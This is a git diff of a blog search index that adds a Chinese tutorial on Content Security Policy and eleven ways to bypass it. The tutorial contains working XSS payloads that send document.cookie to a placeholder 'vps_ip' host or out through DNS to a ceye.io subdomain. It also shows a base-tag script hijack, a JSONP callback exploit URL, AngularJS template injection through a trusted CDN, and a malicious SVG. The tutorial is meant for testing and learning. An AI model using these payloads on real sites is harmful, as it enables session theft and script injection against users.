@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[learning_CSP]]></title>
+    <url>%2F2019%2F12%2F13%2Flearning-CSP%2F</url>
+    <content type="text"><![CDATA[##0X00 前言由于最近被问到CSP绕过的一些技巧，平时虽然在xss、jsonp劫持中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。 0X01 什么是CSPCSP全称Content Security Policy ,可以直接翻译为内容安全策略,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程资源）。举个例子：我们经常可以在http头中看到下面头信息：1Content-Security-Policy: default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos; 或者在页面中看到：1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos;&quot;&gt; 这两种表达的含义一致，代表了默认信任同源和www.sunu11.com的资源；页面中允许执行javascript，允许使用内联资源如``标签、事件监听函数。它通过两组策略进行规定，每组策略包含一个策略指令和一个内容源列表 那下面简单介绍一下常用的策略指令：default-srcdefault-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括： child-src 指定定义了 web workers 以及嵌套的浏览上下文（如和）的源 connect-src 定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源 font-src 定义了字体加载的有效来源 img-src 定义了图片或者图标加载的有效来源 media-src 定义了媒体文件加载的有效来源如HTML6的 &lt;audio&gt;, &lt;video&gt;等元素 object-src 定义页面插件的过滤策略,如 &lt;object&gt;, &lt;embed&gt;或者&lt;applet&gt;等元素 script-src 定义页面中javascript有效来源，它可以设置一些特殊值，如nonce（每次http回应给出一个授权token并内嵌脚本必须有token才会被执行）、hash（列出允许执行的脚本代码的hash值，在hash相吻合下才能执行内嵌脚本） style-src 定义页面中CSS样式的有效来源 那啥是内容源呢：内容源分三种：源列表、关键字与数据源列表是一个字符串,主要是指定主机或者域名，包括对应端口。可以用*来代表通配符：如： http://*.sunu11.com sunu11.com:8080 https://vpn.sunu11.com 关键字主要有以下几个： ‘none’ 空，不匹配任何URL ‘self’ 代表与文档同源，包括相同的URL协议和端口号。 ‘unsafe-inline’ 允许使用内联资源（javascript:URL、内联的事件处理函数与&lt;style&gt;、&lt;script&gt;元素）， ‘unsafe-eval’ 允许使用eval()等通过字符串创建代理的方法 使用 &#39;unsafe-inline&#39; 和 &#39;unsafe-eval&#39; 都是不安全的，它们会导致网站有跨站脚本攻击风险。 数据1234data: 允许data:URL作为内容来源mediastream: 允许mediastream:URL作为内容来源 0x02如何绕过CSP限制下面总结了一些可能遇到CSP策略后bypass的方法： 1、可控的CRLF漏洞点当存在CRLF漏洞，且可控点在csp上方，可以通过注入回车换行符将CSP策略挤到返回体body部分，使其失效。注入成功后，可看到回显如下图所示： 2、iframe绕过当同源站点同时存在多个页面，可以利用没有CSP保护页面的XSS漏洞窃取被保护页面的数据：比如A页面：1234&lt;html&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;self&apos;&quot;&gt;&lt;h1 test=“foo”&gt;A测试页面&lt;/h1&gt;&lt;/html&gt; B页面：12345678910&lt;html&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement(‘iframe’);iframe.src=&quot;A页面&quot;;document.body.appendChild(iframe);setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&apos;foo&apos;).innerHTML),1000);&lt;/script&gt;&lt;/body&gt;&lt;!-- 模拟XSS获取A页面的foo,使用setTimeout是需要等待iframe加载完A页面--&gt;&lt;/html&gt; 当我们访问到B页面即可看到A测试页面被打印。 3、使用location.href由于CSP不会影响location.href跳转，我们可以通过构造运行如下js，将需要的数据打回vps上：location.href = &quot;vps_ip:xxxx?&quot;+document.cookie 4、link标签此方法在老版本浏览器中可行，包括我们手里的xss_fuzz的字典应该也有很多使用link带外数据的payload：1234var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link); 也有一种方法是将cookie作为子域名，用dns通道将cookie带出去。例如：123456789&lt;script&gt; dcl = document.cookie.split(&quot;;&quot;); n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0]; for (var i=0; i&lt;dcl.length;i++) &#123; console.log(dcl[i]); n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//&quot; + escape(dcl[i].replace(///g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.replace(/./g, &quot;-&quot;) + &quot;.xxx.ceye.io&quot;&gt;&quot;; &#125;&lt;/script&gt; 这里要考虑到域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换,然后用ceye平台查看记录，替换特殊字符即可。 5、SVG绕过由于svg标签可以执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss.我们可以构造一个SVG文件，比如测试a.svg:123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt; &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot; href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt; 6、Base-uri绕过当服务器CSP策略script-src设置了nonce时，如果只设置了default-src没有额外设置base-uri。就可以使用&lt;base&gt;标签使当前页面上下文为自己vps地址。如果页面中script标签采用了相对路径，最终加载的js就是针对base标签中指定url的相对路径.exp：123&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;&lt;base href=&quot;//vps_ip:prot/&quot;&gt;&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt; 我这边2.js没写内容，但可以看到成功引入。此方法仅限页面引用存在相对路径的&lt;script&gt;标签以及上述两个条件。 7、JSONP绕过CSP在回调函数中包装js对象的jsonp接口通常允许第三方域的脚本作为源数据来加载api数据例如&lt;CSP设置为default-src &#39;self&#39; ，且存在json_data.php存在可控jsonp&gt;test.php1234&lt;?phpheader(&quot;Content-Security-Policy: default-src &apos;self&apos; script-src &apos;self&apos; &quot;);echo $_GET[&apos;foo&apos;];?&gt; json_data.php123456&lt;?phpsetcookie(&apos;password&apos;,&apos;1qaz@WSX&apos;);header(&apos;Content-type: application/javascript&apos;);$callback = $_GET[&apos;callback&apos;];$data = &quot;&#123;&apos;name&apos;:&apos;sunu11&apos;&#125;&quot;;echo $callback . &quot;(&quot; . json_encode($data) . &quot;)&quot;; exp:1http://127.0.0.1:8080/test.php?foo=%3Cscript%20src=%22http://127.0.0.1:8080/json_data.php?callback=alert(document.cookie)%22%20%3E%3C/script%3E 另外一些存在用户可控资源或jsonp较常用站点的github项目：https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180 8、利用浏览器补全绕过nonce：如果存在CSP策略需要绕过进行XSS：&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;nonce-foo&#39;&quot;&gt; 我们测试代码如下: 123456&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-foo&apos;&quot;&gt;&lt;?php echo $_GET[&apos;foo&apos;]?&gt;&lt;script nonce=&apos;foo&apos;&gt;&lt;!-- test --&gt;&lt;/script&gt; 由于CSP 配置有nonce-foo，且在接受foo穿参后就有nonce=‘foo’，因此考虑插入&lt;script src=data:text/php,alert(1),让&lt;script nonce=&#39;foo&#39;&gt;前面的&lt;不被解析，而利用页面原有的nonce=&#39;foo’进行绕过。xss语句可构造为： 9、CDN bypass在oragne大佬挖掘HackMD所存在的xss过程中，绕过CSP时发现HackMD给出的CSP信任名单有一个https://cdnjs.cloudflare.com/,这个cdn提供了许多第三方示例库以供引入，因此可以通过AngularJS的模板注入引入js。Exp:123456&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt; &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;&lt;/div&gt;//sssss&quot; --&gt; 具体分析文章可以参考:https://paper.seebug.org/855/ 10、可控静态资源如果站点存在CSP策略限制，但受限站点有可控的静态资源，我们可以利用可控的静态资源来完成。例如K1tten在 Review CodiMD 的Repo后发现的一处stored xss漏洞，也具有CSP限制。但他们通过找到www.google-analytics.com中提供的自定义javascript功能，再加上CSP 策略在同时有 www.google-analytics.com 以及 unsafe-eval这样的配置下可以执行任意JavaScript。因此可以绕过CSP的限制执行xss。具体过程可以参考K1tten的wp：https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md 11、使用PDFxss绕过object-src在CSP标准里，object-src是限制插件的src，但js并不受限制。因此我们也可以尝试通过提交pdf文件来引入js，导致客户端的弹窗与URL跳转。&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; src=&quot;//vps_ip/xxx.pdf&quot;&gt;&lt;/embed&gt; 0x03补充总结考虑到上述多次提到同源策略，最后补充一下啥是同源策略：同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。那什么是同源呢：端口相同、域名相同、协议相同的站点就是同源站点。举个例子：相对我的站点：http://sunu11.com/foo/foo.php以下站点是否同源：1234https://sunu11.com/foo/foo.php 不同源 http://sunu11.com:8080/foo/foo.php 不同源http://vpn.sunu11.com/foo/foo.php 不同源http://sunu11.com/foo/foo.php 同源 最后贴上重学CSP所参考的一些文章： https://inside.pixiv.blog/kobo/5137https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives 内容比较基础，文中有描述错误欢迎斧正，有更好案例的希望能够py。感谢浏览至此。]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>bypass</tag>
+        <tag>前端安全</tag>
+        <tag>CSP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[免杀]]></title>
     <url>%2F2019%2F09%2F05%2FTrojans_avoid_killing%2F</url>
     <content type="text"></content>
@@ -10,7 +23,7 @@
     <url>%2F2019%2F09%2F03%2Fpapers%2F</url>
     <content type="text"><![CDATA[本文章记录看到的有价值的文章，可供自己查阅以及参考。感谢作者！！ 1、常见未授权访问漏洞总结(小维)：https://xz.aliyun.com/t/6103]]></content>
       <categories>
-        <category>参考文章</category>
+        <category>other</category>
       </categories>
   </entry>
   <entry>
@@ -126,9 +139,9 @@
         <category>WEB安全</category>
       </categories>
       <tags>
+        <tag>baserCMS</tag>
         <tag>漏洞披漏</tag>
         <tag>代码审计</tag>
-        <tag>baserCMS</tag>
       </tags>
   </entry>
   <entry>
@@ -140,8 +153,8 @@
       </categories>
       <tags>
         <tag>漏洞披漏</tag>
-        <tag>glxcms</tag>
         <tag>代码审计</tag>
+        <tag>glxcms</tag>
       </tags>
   </entry>
   <entry>
